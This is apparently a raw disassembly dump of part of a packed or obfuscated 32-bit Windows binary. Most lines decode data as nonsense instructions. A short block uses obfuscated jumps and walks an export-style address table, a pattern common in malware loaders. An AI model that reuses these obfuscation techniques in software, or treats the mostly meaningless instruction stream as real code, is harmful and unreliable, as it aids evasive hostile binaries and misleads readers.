  40f360:	sbb    DWORD PTR [edi],eax
  40f362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f363:	or     al,0x28
  40f365:	xlat   BYTE PTR ds:[ebx]
  40f366:	les    esp,FWORD PTR [eax-0x775da2a5]
  40f36c:	data16 aam 0x6a
  40f36f:	xchg   ecx,eax
  40f370:	mov    ds:0x5e4778ad,eax
  40f375:	cs mov esp,0x7f56503c
  40f37b:	add    DWORD PTR [ebx],0xc93d14d
  40f381:	loop   0x40f382
  40f383:	loope  0x40f368
  40f385:	cdq    
  40f386:	xor    BYTE PTR [ebp-0x2b],bh
  40f389:	pushf  
  40f38a:	mov    BYTE PTR [eax+0x28],ah
  40f38d:	mov    dl,0xb6
  40f38f:	sub    eax,0x5bbc9935
  40f394:	cli    
  40f395:	mov    bl,0xc9
  40f397:	(bad)  
  40f399:	loop   0x40f3ea
  40f39b:	sub    al,BYTE PTR [esi-0x43ad2c4a]
  40f3a1:	xchg   edx,eax
  40f3a2:	icebp  
  40f3a3:	xor    BYTE PTR [edx+eax*4-0x1d8527b7],al
  40f3aa:	out    0x88,al
  40f3ac:	stos   DWORD PTR es:[edi],eax
  40f3ad:	lods   eax,DWORD PTR ds:[esi]
  40f3ae:	jmp    0x58ea60f7
  40f3b3:	stos   DWORD PTR es:[edi],eax
  40f3b4:	vcvtsi2sd xmm2,xmm4,DWORD PTR [edx-0x58969e9a]
  40f3bc:	or     ecx,DWORD PTR [ecx+0x6c]
  40f3bf:	mov    DWORD PTR [edx],ebx
  40f3c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3c2:	in     al,0x80
  40f3c4:	sub    eax,0xaba67924
  40f3c9:	pop    esp
  40f3ca:	inc    edi
  40f3cb:	and    al,0xa8
  40f3cd:	xchg   DWORD PTR [ebp-0x80],esp
  40f3d0:	dec    edx
  40f3d1:	dec    edx
  40f3d2:	jo     0x40f40b
  40f3d4:	mov    ds:0xe08d6226,al
  40f3d9:	mov    eax,ds
  40f3db:	int3   
  40f3dc:	and    DWORD PTR [esi+esi*8+0x7046c518],edx
  40f3e3:	fcomp  QWORD PTR [eax-0x65]
  40f3e6:	pop    ebx
  40f3e7:	or     esp,esi
  40f3e9:	mov    edx,ebp
  40f3eb:	mov    edi,ebx
  40f3ed:	stos   DWORD PTR es:[edi],eax
  40f3ee:	inc    esi
  40f3ef:	stc    
  40f3f0:	inc    ebx
  40f3f1:	loop   0x40f37f
  40f3f3:	jo     0x40f3e5
  40f3f5:	xor    eax,0x3fa37f9b
  40f3fa:	push   ss
  40f3fb:	adc    DWORD PTR [esi-0x58],esp
  40f3fe:	mov    ds:0x907e250,eax
  40f403:	and    dl,BYTE PTR [esi-0x330518a3]
  40f409:	mov    esp,0x51ef0dfd
  40f40e:	outs   dx,DWORD PTR ds:[esi]
  40f40f:	add    al,0xb7
  40f412:	icebp  
  40f413:	xchg   ebx,eax
  40f414:	dec    ebp
  40f415:	mov    dl,0x6c
  40f417:	sahf   
  40f418:	sub    ebx,ebp
  40f41a:	adc    al,0x6b
  40f41c:	jno    0x40f3f6
  40f41e:	mov    ds:0x3c30d373,eax
  40f423:	or     edi,DWORD PTR [eax-0x22b98105]
  40f429:	iret   
  40f42a:	std    
  40f42b:	adc    DWORD PTR [edi],ecx
  40f42d:	mov    al,0xb8
  40f42f:	out    0x50,al
  40f431:	stc    
  40f432:	mov    esi,0xf06aca3b
  40f437:	jmp    0xc680:0x80ddf31e
  40f43e:	mov    esi,0x931426c1
  40f443:	jmp    DWORD PTR [edx]
  40f445:	clc    
  40f446:	and    al,0x36
  40f448:	or     ah,bh
  40f44a:	xor    BYTE PTR [ebx+0x6669f97],al
  40f450:	js     0x40f497
  40f452:	fidiv  DWORD PTR [eax]
  40f454:	jge    0x40f44c
  40f456:	out    0x9d,eax
  40f458:	cs xchg ecx,eax
  40f45a:	sbb    bl,bh
  40f45c:	rcl    ebx,1
  40f45e:	sahf   
  40f45f:	(bad)  
  40f460:	xor    cl,BYTE PTR [esi+0x7f127b07]
  40f466:	ins    DWORD PTR es:[edi],dx
  40f467:	lock aad 0x4
  40f46a:	or     al,0x4a
  40f46c:	xchg   esi,eax
  40f46d:	jp     0x40f4da
  40f46f:	ret    0x3b8a
  40f472:	leave  
  40f473:	les    esi,FWORD PTR [edx]
  40f475:	jl     0x40f40a
  40f477:	stc    
  40f478:	adc    al,0x4c
  40f47a:	push   0x40
  40f47c:	or     BYTE PTR [edx+0x4ebac673],bh
  40f482:	dec    esp
  40f483:	or     eax,0x9b95d47a
  40f488:	pop    ebx
  40f489:	sbb    DWORD PTR [edi-0x7],eax
  40f48c:	mov    edx,0x42d677f4
  40f491:	fiadd  WORD PTR [ebx+0x45]
  40f494:	js     0x40f421
  40f496:	jns    0x40f4a6
  40f498:	sbb    cl,BYTE PTR [edx-0x21dd6b32]
  40f49e:	pushf  
  40f49f:	daa    
  40f4a0:	mov    eax,ds:0x733e9ad3
  40f4a5:	mov    bh,0x4b
  40f4a7:	mov    ecx,0xae937f63
  40f4ac:	mov    dh,0x68
  40f4ae:	push   ebp
  40f4af:	out    dx,eax
  40f4b0:	ja     0x40f514
  40f4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4b3:	aaa    
  40f4b4:	aad    0xee
  40f4b6:	mov    ah,0x91
  40f4b8:	int3   
  40f4b9:	in     al,0xf9
  40f4bb:	sub    bl,dh
  40f4bd:	sub    bl,ch
  40f4bf:	dec    dh
  40f4c1:	(bad)
  40f4c4:	xor    DWORD PTR ds:0xa441a31d,ebp
  40f4ca:	push   0xffffffcd
  40f4cc:	lock push ecx
  40f4ce:	cmp    edx,edx
  40f4d0:	shl    edx,0x45
  40f4d3:	hlt    
  40f4d4:	sub    al,0x60
  40f4d6:	ret    
  40f4d7:	sub    cl,BYTE PTR [ebx+0x4d]
  40f4da:	sub    eax,0xe4dc25fa
  40f4df:	inc    esp
  40f4e0:	jmp    0x23c9883
  40f4e5:	loop   0x40f4dc
  40f4e7:	aad    0x8b
  40f4e9:	cmp    eax,0xd41241f1
  40f4ee:	inc    ebp
  40f4ef:	test   eax,0x9070701b
  40f4f4:	mov    bh,0x8f
  40f4f6:	mov    eax,ds:0xfcd32fc3
  40f4fb:	and    edx,esi
  40f4fd:	sar    esp,cl
  40f4ff:	repz inc esp
  40f501:	sub    dl,ah
  40f503:	pop    ebx
  40f504:	int    0x8
  40f506:	call   0x28e:0xe9d854fe
  40f50d:	add    DWORD PTR [ecx],0xeb58a338
  40f513:	cmp    esi,ebp
  40f515:	push   ss
  40f516:	aaa    
  40f517:	sbb    al,0x32
  40f519:	add    DWORD PTR [edx],esp
  40f51b:	fsubr  QWORD PTR [ebx-0x7d]
  40f51e:	sbb    al,0x57
  40f520:	cmc    
  40f521:	adc    eax,0x5484a3db
  40f526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f527:	sub    eax,0xfe8381fc
  40f52c:	(bad)  
  40f52d:	aaa    
  40f52e:	dec    esp
  40f52f:	dec    ecx
  40f530:	inc    esp
  40f531:	pop    esp
  40f532:	or     ecx,esi
  40f534:	cmp    eax,0xedcbc2bf
  40f539:	retf   0x9b4
  40f53c:	popf   
  40f53d:	jg     0x40f4dd
  40f53f:	in     al,0x91
  40f541:	mov    dl,0xf2
  40f543:	adc    DWORD PTR [ecx-0x46],edi
  40f546:	mov    ah,0xd4
  40f548:	into   
  40f549:	ins    BYTE PTR es:[edi],dx
  40f54a:	outs   dx,DWORD PTR ds:[esi]
  40f54b:	xor    BYTE PTR [edi],bh
  40f54d:	clc    
  40f54e:	push   edi
  40f54f:	ret    
  40f550:	push   ss
  40f551:	ds stos DWORD PTR es:[edi],eax
  40f553:	aam    0xc8
  40f555:	pop    ebx
  40f556:	addr16 in al,0xe8
  40f559:	loope  0x40f53a
  40f55b:	std    
  40f55c:	add    dh,BYTE PTR [esi+0x3da2e8cd]
  40f562:	(bad)  
  40f563:	sbb    eax,0xafc67900
  40f568:	or     al,BYTE PTR [eax]
  40f56a:	lods   eax,DWORD PTR ds:[esi]
  40f56b:	outs   dx,DWORD PTR ds:[esi]
  40f56c:	or     BYTE PTR ds:0xa5bafbd1,0xed
  40f573:	pop    esp
  40f574:	xchg   edx,eax
  40f575:	shl    ah,cl
  40f577:	scas   eax,DWORD PTR es:[edi]
  40f578:	ss pushf 
  40f57a:	retf   0xf0b0
  40f57d:	sti    
  40f57e:	xor    al,0x50
  40f580:	scas   al,BYTE PTR es:[edi]
  40f581:	ja     0x40f577
  40f583:	aaa    
  40f584:	jno    0x40f50e
  40f586:	jae    0x40f5e5
  40f588:	sbb    DWORD PTR [esi+0x3a0b95ac],ebx
  40f58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f58f:	xor    ah,ah
  40f591:	inc    ebx
  40f592:	fdiv   QWORD PTR [ebp+0x7fc185ab]
  40f598:	fnstsw WORD PTR [ebp+eiz*1-0x66]
  40f59c:	add    eax,0x83d2fa07
  40f5a1:	mov    ebx,0x89d2b51c
  40f5a6:	and    eax,0x66a8daa3
  40f5ab:	(bad)  [eax+0x69]
  40f5ae:	push   es
  40f5af:	xchg   edi,eax
  40f5b0:	(bad)  
  40f5b1:	xlat   BYTE PTR ds:[ebx]
  40f5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5b3:	cmp    ecx,eax
  40f5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi+0x285c25fb]
  40f687:	jb     0x40f66f
  40f689:	pop    edx
  40f68a:	ret    
  40f68b:	scas   eax,DWORD PTR es:[edi]
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0x69
  40f693:	retf   0xee74
  40f696:	ret    0x73c8
  40f699:	xor    dl,BYTE PTR [eax-0x51]
  40f69c:	ret    
  40f69d:	jl     0x40f71e
  40f69f:	mov    ch,0x91
  40f6a1:	xor    bl,BYTE PTR [edi+0x4]
  40f6a4:	shr    DWORD PTR [ebx+0x1bfcf2d6],0xb
  40f6ab:	mov    cl,0x3
  40f6ad:	mov    DWORD PTR ds:0x18e3c0e1,edx
  40f6b4:	sbb    eax,0x4c8217af
  40f6b9:	sbb    eax,DWORD PTR ds:0x1f693bf4
  40f6bf:	cmc    
  40f6c0:	(bad)  
  40f6c1:	jp     0x40f6b0
  40f6c3:	jmp    0x2322:0x3bd3048a
  40f6ca:	mov    ecx,fs
  40f6cc:	bound  esp,QWORD PTR [ebx-0x4b]
  40f6cf:	and    ebx,esi
  40f6d1:	xor    DWORD PTR [edx-0x13ffc94f],ebx
  40f6d7:	into   
  40f6d8:	sub    DWORD PTR [eax+0x5e],ebp
  40f6db:	rcr    DWORD PTR [edx+0x881aa96],1
  40f6e1:	sub    al,0x90
  40f6e3:	jo     0x40f6d8
  40f6e5:	scas   eax,DWORD PTR es:[edi]
  40f6e6:	and    ebx,DWORD PTR [ecx+ebp*4-0x41383b8a]
  40f6ed:	and    ebx,DWORD PTR [ebx-0x397627df]
  40f6f3:	out    0xe6,eax
  40f6f5:	inc    ecx
  40f6f6:	lods   eax,DWORD PTR ds:[esi]
  40f6f7:	arpl   WORD PTR [ebp-0x313564f1],bp
  40f6fd:	(bad)  [edx]
  40f6ff:	jmp    0x40f6a4
  40f701:	mov    al,ds:0x58b44c3a
  40f706:	xchg   esi,eax
  40f707:	loopne 0x40f6ad
  40f709:	xchg   esp,eax
  40f70a:	mov    WORD PTR [edx+0x17b112ab],cs
  40f710:	arpl   WORD PTR [esi-0x79dd80fc],bx
  40f716:	pop    di
  40f718:	fbld   TBYTE PTR [ebx-0x6f2ac756]
  40f71e:	add    dh,bl
  40f720:	jae    0x40f756
  40f722:	out    0xce,eax
  40f724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f725:	or     al,0x83
  40f727:	rcl    DWORD PTR [edi+0x5c],0x7e
  40f72b:	arpl   WORD PTR [ebx-0x80],di
  40f72e:	test   DWORD PTR [ebx],ebx
  40f730:	cs jbe 0x40f7b2
  40f733:	(bad)
  40f736:	push   ebx
  40f737:	int    0x7
  40f739:	lock inc esp
  40f73b:	xor    al,0x74
  40f73d:	sahf   
  40f73e:	ret    
  40f73f:	iret   
  40f740:	sbb    eax,0x9f86aceb
  40f745:	push   ecx
  40f746:	jp     0x40f6c8
  40f748:	and    eax,0xf26522b8
  40f74d:	mov    ah,0xda
  40f74f:	not    dh
  40f751:	dec    edi
  40f752:	adc    dl,cl
  40f754:	call   0xd8e4b2ab
  40f759:	add    ah,BYTE PTR [edx]
  40f75b:	jecxz  0x40f6f8
  40f75d:	jno    0x40f761
  40f75f:	jmp    0x40f742
  40f761:	jnp    0x40f724
  40f763:	mov    ecx,0xad39daf
  40f768:	push   edi
  40f769:	add    eax,ebp
  40f76b:	je     0x40f75f
  40f76d:	cld    
  40f76e:	jl     0x40f734
  40f770:	(bad)  
  40f771:	sbb    ecx,ebp
  40f773:	push   ds
  40f774:	rcl    BYTE PTR [edx+0x1cdcbb7c],cl
  40f77a:	adc    cl,ah
  40f77c:	and    BYTE PTR gs:[esi+0x67dc7492],dh
  40f783:	mov    dl,0x88
  40f785:	dec    edx
  40f786:	lock jmp 0xc8794807
  40f78c:	outs   dx,DWORD PTR ds:[esi]
  40f78d:	cmp    esi,0xffffffd1
  40f790:	and    ebx,DWORD PTR [esi+0x54dffce2]
  40f796:	jl     0x40f71e
  40f798:	jb     0x40f790
  40f79a:	fld    QWORD PTR [esi]
  40f79c:	imul   esp
  40f79e:	add    eax,0x11f8dd5
  40f7a3:	inc    ecx
  40f7a4:	cmp    ch,cl
  40f7a6:	ret    
  40f7a7:	daa    
  40f7a8:	clc    
  40f7a9:	out    0xad,eax
  40f7ab:	in     al,dx
  40f7ac:	xor    edx,DWORD PTR [ecx-0x49]
  40f7af:	mov    edi,0xe2276f9f
  40f7b4:	jmp    0x3c7e860d
  40f7b9:	lea    esi,[eax+0x7888fac8]
  40f7bf:	fidivr DWORD PTR [ecx]
  40f7c1:	leave  
  40f7c2:	jno    0x40f834
  40f7c4:	push   eax
  40f7c5:	aaa    
  40f7c6:	lock in al,0x9
  40f7c9:	das    
  40f7ca:	aam    0xfb
  40f7cc:	(bad)  
  40f7ce:	cdq    
  40f7cf:	(bad)  
  40f7d0:	cmp    dh,BYTE PTR [edx-0x590a3f1e]
  40f7d6:	add    eax,0x4bb24db3
  40f7db:	mov    ebx,0x421ffdd6
  40f7e0:	int3   
  40f7e1:	add    edx,esi
  40f7e3:	mov    ebx,0xbe371a91
  40f7e8:	xor    BYTE PTR [eax-0x45],0x1f
  40f7ec:	xchg   edi,eax
  40f7ed:	jno    0x40f7db
  40f7ef:	jmp    0xba016b78
  40f7f4:	sbb    eax,DWORD PTR [ebx-0x7db242a1]
  40f7fa:	ja     0x40f7b5
  40f7fc:	mov    dh,0x25
  40f7fe:	rcl    BYTE PTR [esp+ebp*2-0x3f18d080],cl
  40f805:	ja     0x40f7d4
  40f807:	test   DWORD PTR [ecx],eax
  40f809:	xchg   ebx,eax
  40f80a:	mov    ds:0xb621bdcb,eax
  40f80f:	into   
  40f810:	dec    esi
  40f811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f812:	jae    0x40f86a
  40f814:	hlt    
  40f815:	dec    edi
  40f816:	pop    edx
  40f817:	inc    esi
  40f818:	test   eax,0xf801b11b
  40f81d:	push   ebp
  40f81e:	ds xor al,0x4a
  40f821:	int3   
  40f822:	sar    DWORD PTR [ebx+0x22],1
  40f825:	jle    0x40f7c6
  40f827:	and    eax,0x554e6672
  40f82c:	bound  eax,QWORD PTR [esi]
  40f82e:	add    ebp,DWORD PTR [eax+0xb]
  40f831:	test   esp,0x970a4d54
  40f837:	add    eax,0x4d4d04d3
  40f83c:	ins    BYTE PTR es:[edi],dx
  40f83d:	xchg   esp,eax
  40f83e:	and    eax,0xfa4be4f3
  40f843:	jge    0x40f896
  40f845:	fistp  WORD PTR [ebp+0x1f]
  40f848:	dec    edi
  40f849:	rol    DWORD PTR [edx-0x76c39f6a],cl
  40f84f:	lds    edi,FWORD PTR [eax-0x17]
  40f852:	push   ds
  40f853:	(bad)  
  40f854:	jae    0x40f7e4
  40f856:	xor    ebp,DWORD PTR [esi]
  40f858:	mov    ebx,0x4d4c765e
  40f85d:	xchg   esi,eax
  40f85e:	sub    eax,0xb133cbdd
  40f863:	adc    esp,eax
  40f865:	and    BYTE PTR [ebx-0x132d7c42],0xcf
  40f86c:	mov    edx,0xbcfb1590
  40f871:	and    esp,ebp
  40f873:	stos   BYTE PTR es:[edi],al
  40f874:	mov    WORD PTR [ecx-0x5a63bb46],?
  40f87a:	into   
  40f87b:	xchg   edx,eax
  40f87c:	push   ebx
  40f87d:	sbb    eax,DWORD PTR [edx+ebx*8]
  40f880:	or     DWORD PTR [eax-0x32],edi
  40f883:	sbb    eax,0x2fcad812
  40f888:	mov    ebx,0xe4107ae5
  40f88d:	cwde   
  40f88e:	mov    esi,0x71d240a2
  40f893:	ins    BYTE PTR es:[edi],dx
  40f894:	jno    0x40f86b
  40f896:	ins    DWORD PTR es:[edi],dx
  40f897:	fistp  DWORD PTR [ecx+esi*1]
  40f89a:	arpl   WORD PTR ds:0xd39e8bc9,bx
  40f8a0:	mov    eax,0x3f0fe9a7
  40f8a5:	mov    al,ds:0x263e5632
  40f8aa:	mov    cl,0xe
  40f8ac:	jbe    0x40f886
  40f8ae:	add    ebp,edi
  40f8b0:	xchg   esi,eax
  40f8b1:	mov    bl,BYTE PTR [ebp+0x449f3de2]
  40f8b7:	jo     0x40f8f8
  40f8b9:	mov    edx,0x3a8d128a
  40f8be:	push   cs
  40f8bf:	mov    ebx,0x44d75f1a
  40f8c4:	popf   
  40f8c5:	fnop   
  40f8c7:	test   eax,0x59275944
  40f8cc:	hlt    
  40f8cd:	enter  0xee2e,0xd2
  40f8d1:	jmp    DWORD PTR [ebx-0x64]
  40f8d4:	into   
  40f8d5:	cmp    dl,cl
  40f8d7:	cld    
  40f8d8:	push   ds
  40f8d9:	inc    esp
  40f8da:	call   0x47cb67ed
  40f8df:	std    
  40f8e0:	push   esi
  40f8e1:	dec    ebp
  40f8e2:	inc    esp
  40f8e3:	cmp    al,0xf
  40f8e5:	or     esi,ebx
  40f8e7:	sub    DWORD PTR [ecx-0x17695302],ebx
  40f8ed:	sub    DWORD PTR [ecx+0x4e269208],edi
  40f8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8f4:	inc    esi
  40f8f5:	xor    cl,dh
  40f8f7:	push   es
  40f8f8:	xlat   BYTE PTR ds:[ebx]
  40f8f9:	fnstsw ax
  40f8fb:	xchg   ebp,eax
  40f8fc:	adc    cl,bh
  40f8fe:	pop    edi
  40f8ff:	dec    ecx
  40f900:	push   esp
  40f901:	enter  0x31a6,0x72
  40f905:	mov    bh,0x2a
  40f907:	pop    esp
  40f908:	jbe    0x40f8d0
  40f90a:	sbb    ecx,DWORD PTR [ebp-0x75]
  40f90d:	cmp    BYTE PTR [ebx-0x4b],ch
  40f910:	inc    esi
  40f911:	pop    ebx
  40f912:	pusha  
  40f913:	sub    DWORD PTR [ebp-0x61],edi
  40f916:	(bad)
  40f919:	cmp    edi,esp
  40f91b:	(bad)  
  40f91c:	sbb    ebx,DWORD PTR [edx]
  40f91e:	xchg   edx,eax
  40f91f:	add    BYTE PTR [edi+ebp*1],dh
  40f922:	pop    ecx
  40f923:	les    ecx,FWORD PTR [esi-0x2ac4a735]
  40f929:	lods   al,BYTE PTR ds:[esi]
  40f92a:	sbb    DWORD PTR [ebx+0x3f],ebp
  40f92d:	mov    ebx,0xf2f7048d
  40f932:	mov    edx,0x1f6b6486
  40f937:	pusha  
  40f938:	and    eax,0x6ea1148d
  40f93d:	mov    esp,0x6afaf768
  40f942:	dec    ecx
  40f943:	mov    cl,0x9c
  40f945:	pop    es
  40f946:	xor    BYTE PTR [esi],bh
  40f948:	rcr    BYTE PTR [esi],0x57
  40f94b:	daa    
  40f94c:	loop   0x40f923
  40f94e:	mov    ebx,edi
  40f950:	aaa    
  40f951:	xor    BYTE PTR [ecx+edi*8],bh
  40f954:	(bad)  
  40f955:	pusha  
  40f956:	icebp  
  40f957:	addr16 ret 0x6042
  40f95b:	std    
  40f95c:	cmp    BYTE PTR [eax],al
  40f95e:	sub    DWORD PTR [eax+0x5a],0x48
  40f962:	jnp    0x40f9c5
  40f964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f965:	popa   
  40f966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f967:	ja     0x40f94f
  40f969:	jnp    0x40f909
  40f96b:	push   ss
  40f96c:	cli    
  40f96d:	cwde   
  40f96e:	mov    ds:0x97eb8b31,al
  40f973:	dec    edi
  40f974:	pop    ebp
  40f975:	dec    ecx
  40f976:	and    BYTE PTR [esi-0x25f82a47],ch
  40f97c:	xchg   esi,eax
  40f97d:	daa    
  40f97e:	in     al,dx
  40f97f:	sbb    al,0xa8
  40f981:	push   0xffffffa4
  40f983:	(bad)  
  40f985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f986:	pop    ebp
  40f987:	push   cs
  40f988:	or     BYTE PTR [edx],bh
  40f98a:	mov    cl,0x5e
  40f98c:	mov    ?,WORD PTR [edi+0x11469720]
  40f992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f993:	jbe    0x40f9e9
  40f995:	pop    ebx
  40f996:	cmp    ecx,0x61f56904
  40f99c:	pop    edx
  40f99d:	loop   0x40f930
  40f99f:	cmp    al,0xc2
  40f9a1:	sbb    al,BYTE PTR [edi-0x73]
  40f9a4:	push   ebp
  40f9a5:	(bad)  
  40f9a6:	out    dx,eax
  40f9a7:	add    eax,0x628549f4
  40f9ac:	mov    eax,ds:0x2104198b
  40f9b1:	adc    al,0xb9
  40f9b3:	mov    ebx,0xcc3d5fc6
  40f9b8:	add    BYTE PTR [edi+edx*8],0xf0
  40f9bc:	(bad)  
  40f9bd:	pusha  
  40f9be:	push   ss
  40f9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c0:	addr16 jl 0x40f99d
  40f9c3:	dec    edx
  40f9c4:	and    al,0xd8
  40f9c6:	jns    0x40f9fa
  40f9c8:	dec    esp
  40f9c9:	pushw  cs
  40f9cb:	das    
  40f9cc:	or     cl,al
  40f9ce:	loopne 0x40fa3c
  40f9d0:	sbb    BYTE PTR [eax+edx*8-0x1a0c31ec],al
  40f9d7:	ror    DWORD PTR ds:0x7fb84128,0xeb
  40f9de:	cmp    DWORD PTR [ebx+0x72],ebx
  40f9e1:	pop    esi
  40f9e2:	iret   
  40f9e3:	sbb    bh,BYTE PTR [edx]
  40f9e5:	hlt    
  40f9e6:	mov    si,0x928b
  40f9ea:	js     0x40f96f
  40f9ec:	aad    0x74
  40f9ee:	in     al,dx
  40f9ef:	and    edx,DWORD PTR [esi]
  40f9f1:	jno    0x40fa23
  40f9f3:	push   ecx
  40f9f4:	mov    eax,0xac777f5b
  40f9f9:	arpl   si,cx
  40f9fb:	add    ebx,DWORD PTR [edx+0xedd9af1]
  40fa01:	and    edx,DWORD PTR [ebx-0x3b]
  40fa04:	inc    esi
  40fa05:	sub    edi,DWORD PTR ds:0x76bfc797
  40fa0b:	out    0xd4,al
  40fa0d:	jno    0x40f9ff
  40fa0f:	pop    ecx
  40fa10:	xlat   BYTE PTR ds:[ebx]
  40fa11:	(bad)  
  40fa12:	lea    ecx,[eax-0x55]
  40fa15:	ret    
  40fa16:	mov    cl,0x24
  40fa18:	icebp  
  40fa19:	pop    edi
  40fa1a:	mov    ds:0xfcc31589,eax
  40fa1f:	mov    bl,0xfc
  40fa21:	push   cs
  40fa22:	sar    DWORD PTR [edi],1
  40fa24:	inc    ecx
  40fa25:	or     eax,0x81dab537
  40fa2a:	jle    0x40fa0f
  40fa2c:	inc    edx
  40fa2d:	ds sbb al,0xab
  40fa30:	mov    dh,0x6
  40fa32:	push   eax
  40fa33:	and    eax,0x79229733
  40fa38:	sub    bh,ah
  40fa3a:	inc    ebx
  40fa3b:	adc    al,0x67
  40fa3d:	(bad)  
  40fa3e:	jo     0x40f9e1
  40fa40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa41:	aas    
  40fa42:	clc    
  40fa43:	jb     0x40fa87
  40fa45:	jne    0x40fa53
  40fa47:	je     0x40fa55
  40fa49:	cmp    edi,edi
  40fa4b:	aad    0xe9
  40fa4d:	pusha  
  40fa4e:	mov    edi,0xb53667d3
  40fa53:	hlt    
  40fa54:	std    
  40fa55:	adc    cl,BYTE PTR [ebp+0x29dcc4b7]
  40fa5b:	jg     0x40fac6
  40fa5d:	sub    dl,bl
  40fa5f:	fiadd  WORD PTR [eax-0x7e]
  40fa62:	repz fstp DWORD PTR [eax+edx*2+0x7db91c92]
  40fa6a:	ins    DWORD PTR es:[edi],dx
  40fa6b:	sub    eax,0x5aa246d5
  40fa70:	mov    eax,ds:0xa5dca4c
  40fa75:	sbb    cl,BYTE PTR [edx+0x78]
  40fa78:	push   eax
  40fa79:	and    BYTE PTR [ecx],al
  40fa7b:	mov    al,0x9a
  40fa7d:	js     0x40fa11
  40fa7f:	push   ds
  40fa80:	pop    edx
  40fa81:	loope  0x40faac
  40fa83:	cwde   
  40fa84:	xor    eax,0x4b1c2955
  40fa89:	xchg   DWORD PTR [ebx-0x5b2c3039],eax
  40fa8f:	rcl    DWORD PTR [edi],0x1e
  40fa92:	imul   eax,DWORD PTR [ebp+0x4930ed05],0xf243c038
  40fa9c:	fwait
  40fa9d:	xor    DWORD PTR [ecx+edx*2-0x71],0xffffff96
  40faa2:	add    eax,0xfc3dd476
  40faa7:	jo     0x40fadf
  40faa9:	in     al,dx
  40faaa:	push   0xd74d637c
  40faaf:	pop    ds
  40fab0:	(bad)  
  40fab1:	and    al,0xfc
  40fab3:	sub    edx,DWORD PTR [eax]
  40fab5:	das    
  40fab6:	(bad)  
  40fab7:	ret    0x6c51
  40faba:	fwait
  40fabb:	pop    esi
  40fabc:	push   ecx
  40fabd:	repz mov ds,esp
  40fac0:	pop    DWORD PTR [edi+0x44]
  40fac3:	cld    
  40fac4:	pusha  
  40fac5:	sub    cl,BYTE PTR [esi+0x507484fc]
  40facb:	jae    0x40faad
  40facd:	push   ecx
  40face:	mov    esi,0x4d1b38ca
  40fad3:	or     DWORD PTR [ebx+0x7b091f69],0x1845b1cf
  40fadd:	and    DWORD PTR [esi],eax
  40fadf:	mov    eax,ds:0x90cd6005
  40fae4:	mov    bh,bl
  40fae6:	sub    BYTE PTR [ecx+0x4414c9c8],bh
  40faec:	cmp    eax,0x7a3db951
  40faf1:	shr    BYTE PTR [ecx],1
  40faf3:	sbb    al,0x1d
